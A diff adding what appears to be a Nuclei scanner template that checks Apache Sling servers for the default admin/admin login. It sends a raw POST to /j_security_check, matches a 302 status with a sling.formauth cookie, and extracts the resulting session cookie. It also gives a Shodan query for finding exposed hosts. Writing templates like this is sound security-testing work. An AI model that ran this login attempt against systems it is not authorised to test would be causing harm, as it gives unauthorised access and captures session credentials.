@@ -1,0 +1,67 @@
+id: apache-sling-default-login
+
+info:
+  name: Apache Sling - Default Login
+  author: icarot
+  severity: high
+  description: |
+    Apache Sling default login was discovered.
+  reference:
+    - https://github.com/apache/sling
+  metadata:
+    max-request: 1
+    vendor: apache
+    product: sling
+    shodan-query: title:"Apache Sling"
+  tags: apache,sling,default-login
+
+http:
+  - raw:
+      - |
+        POST /j_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBCQeiTztQvBDyNxA
+        Connection: keep-alive
+        Content-Length: 445
+
+        ------WebKitFormBoundaryBCQeiTztQvBDyNxA
+        Content-Disposition: form-data; name="_charset_"
+
+        UTF-8
+        ------WebKitFormBoundaryBCQeiTztQvBDyNxA
+        Content-Disposition: form-data; name="resource"
+
+        /
+        ------WebKitFormBoundaryBCQeiTztQvBDyNxA
+        Content-Disposition: form-data; name="j_username"
+
+        {{username}}
+        ------WebKitFormBoundaryBCQeiTztQvBDyNxA
+        Content-Disposition: form-data; name="j_password"
+
+        {{password}}
+        ------WebKitFormBoundaryBCQeiTztQvBDyNxA--
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Set-Cookie: sling.formauth"
+        part: header
+      - type: status
+        status:
+          - 302
+    extractors:
+      - type: regex
+        name: cookie
+        group: 1
+        part: header
+        regex:
+          - "Set-Cookie: sling.formauth=(?<sling_formauth>\\w+);"
